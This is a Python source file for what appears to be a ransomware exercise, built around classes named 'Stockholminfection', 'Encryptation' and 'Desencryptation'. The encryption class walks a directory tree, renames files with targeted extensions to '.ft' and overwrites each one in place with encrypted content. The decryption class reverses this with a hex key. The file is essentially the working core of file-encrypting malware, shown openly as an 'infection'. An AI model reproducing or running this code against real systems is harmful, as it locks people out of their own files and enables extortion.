"""Library of functions to find and encrypt the wanted files"""

import os
from cipher_functions import encrypt_message
from cipher_functions import decrypt

class Stockholminfection:
    """Class in charge of create the infection"""
    def __init__(self, logger, path, extensions, key):
        self.logger = logger
        self.path = path
        self.extensions = extensions
        self.key = key
        self._set_key()
        self.files = []

    def run(self):
        """run the engine of the infection"""

    def _set_key(self):
        with open(self.key, 'rb') as keyfile:
            key = keyfile.read()
        self.key = key

    def _search_extension(self, extension, extensions_library = "ft"):
        if extension in extensions_library:
            return True
        return False

class Encryptation(Stockholminfection):
    """Inherited class to encrypt"""
    def run(self):
        """Function that executes the infection"""
        self.search_and_rename_files()
        self.cipher_files()

    def search_and_rename_files(self):
        """Function that find the desired extensions"""
        for root, directories, files in os.walk(self.path):
            for file in files:
                if self._search_extension(file.split(".")[-1], self.extensions):
                    os.rename(root + '/' + file, root + '/' + file.split(".")[0] + ".ft")
                    self.files.append(root + '/' + file.split(".")[0] + ".ft")

    def cipher_files(self):
        """function that cipher files"""
        for file in self.files:
            with open(file, 'rb') as textfile:
                data_to_encrypt = textfile.read()
            with open(file, 'wb') as cipheredfile:
                cipheredfile.write(encrypt_message(data_to_encrypt, self.key))

class Desencryptation(Stockholminfection):
    """Inherited class to encrypt"""
    def _set_key(self):
        """Modification of super set key"""
        self.key = bytes.fromhex(self.key)

    def run(self):
        """Function that undo the encryptation"""
        self.search_and_rename_files()
        self.uncipher_files()

    def search_and_rename_files(self):
        """Function that find the desired extensions"""
        for root, directories, files in os.walk(self.path):
            for file in files:
                if self._search_extension(file.split(".")[-1]):
                    os.rename(root + '/' + file, root + '/' + file.split(".")[0])
                    self.files.append(root + '/' + file.split(".")[0])

    def uncipher_files(self):
        """Function that uncipher files"""
        for file in self.files:
            with open(file, 'rb') as textfile:
                data_to_decrypt = textfile.read()
            with open(file, 'wb') as uncipheredfile:
                #uncipheredfile.write(decrypt_message(data_to_decrypt, self.key))
                uncipheredfile.write(decrypt(data_to_decrypt, self.key))
